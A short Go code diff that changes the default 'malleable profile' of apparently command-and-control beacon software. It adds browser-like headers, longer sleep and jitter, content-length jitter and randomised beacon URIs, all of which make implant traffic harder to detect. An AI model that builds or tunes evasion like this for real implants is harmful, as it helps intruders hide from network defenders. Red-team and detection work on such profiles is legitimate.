@@ -17,9 +17,15 @@ func defaultMalleableProfile() MalleableProfile {
 		UserAgent: defaultWindowsUA,
 		BeaconURI: defaultBeaconURI,
 		Method:    "POST",
-		Headers:   map[string]string{"Accept": "*/*"},
-		Sleep:     10,
-		Jitter:    20,
+		Headers: map[string]string{
+			"Accept":          "*/*",
+			"Accept-Language": "en-US,en;q=0.9",
+			"Accept-Encoding": "gzip, deflate, br",
+		},
+		Sleep:               15,
+		Jitter:              30,
+		ContentLengthJitter: 512,
+		JitterURI:           true,
 	}
 }
 
